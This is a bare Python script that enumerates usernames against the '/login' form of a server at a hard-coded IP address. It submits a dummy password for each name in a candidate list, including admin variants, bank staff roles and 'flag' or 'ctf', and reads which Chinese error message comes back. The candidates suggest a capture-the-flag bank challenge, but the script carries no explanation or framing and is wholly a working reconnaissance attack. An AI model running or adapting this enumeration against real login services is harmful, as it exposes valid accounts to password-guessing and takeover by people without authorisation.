import urllib.request, urllib.parse, http.cookiejar, re

BASE = "http://103.163.47.230:33663"


def sess():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [("User-Agent", "Mozilla/5.0")]
    return op


def req(op, p, data=None, method=None):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    h = {"Content-Type": "application/x-www-form-urlencoded"} if body else {}
    r = urllib.request.Request(BASE + p, data=body, headers=h, method=method)
    try:
        resp = op.open(r, timeout=20)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def probe(u):
    op = sess()
    s, b = req(op, "/login", {"username": u, "password": "__nope__"}, "POST")
    if "用户不存在" in b:
        return "NOUSER"
    if "密码错误" in b:
        return "EXISTS"
    if "我的账户" in b:
        return "LOGIN!"
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", b))[:60]


CAND = ["admin", "Admin", "ADMIN", "admin_", "admin__", "admin.", "admin-",
        "admin1", "admin2", "admin0", "administrator", "root", "staff", "employee",
        "teller", "banker", "manager", "operator", "guest", "test", "user",
        "obsidian", "flag", "ctf", "bank", "gold", "star", "vip", "svip",
        "管理员", "柜员", "行长", "夜班", "admin%", "admin ", "admin\t",
        "a", "b", "zzz_not_exist_zzz"]
for u in CAND:
    print(f"  {u!r:18s} -> {probe(u)}")
